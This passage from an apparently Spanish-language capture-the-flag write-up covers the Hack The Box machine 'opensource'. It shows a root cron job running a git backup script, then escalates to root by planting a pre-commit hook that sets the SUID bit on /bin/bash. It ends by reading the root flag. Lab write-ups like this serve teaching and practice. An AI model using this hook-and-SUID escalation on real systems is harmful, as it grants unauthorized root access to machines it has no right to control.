2025/10/03 22:22:01 CMD: UID=0     PID=18691  | /usr/sbin/CRON -f 
2025/10/03 22:22:01 CMD: UID=0     PID=18690  | /usr/sbin/CRON -f 
2025/10/03 22:22:01 CMD: UID=0     PID=18689  | /usr/sbin/CRON -f 
2025/10/03 22:22:01 CMD: UID=0     PID=18699  | cut -d  -f1 
2025/10/03 22:22:01 CMD: UID=0     PID=18700  | /bin/sh -c /usr/local/bin/git-sync 
2025/10/03 22:22:01 CMD: UID=???   PID=18703  | ???
2025/10/03 22:22:01 CMD: UID=0     PID=18705  | 
2025/10/03 22:22:01 CMD: UID=0     PID=18708  | git commit -m Backup for 2025-10-03 
2025/10/03 22:22:01 CMD: UID=0     PID=18709  | git push origin main 
2025/10/03 22:22:01 CMD: UID=0     PID=18711  | git push origin main 
```

```bash wrap=false title='/usr/local/bin/git-sync'
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

Lo que se me ocurre para aprovecharnos de este repo es usar `git hooks`, con ellos podemos ejecutar comandos como el usuario dueño, **root**:

```bash wrap=false
dev01@opensource:~/.git$ echo 'chmod u+s /bin/bash' > /home/dev01/.git/hooks/pre-commit
dev01@opensource:~/.git$ chmod +x /home/dev01/.git/hooks/pre-commit
dev01@opensource:~/.git$ ls -la /bin/bash 
-rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
dev01@opensource:~/.git$ bash -p
bash-4.4# whoami
root
bash-4.4# cat /root/root.txt 
b9c4e4aafb442a54ea...
```

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/471)

---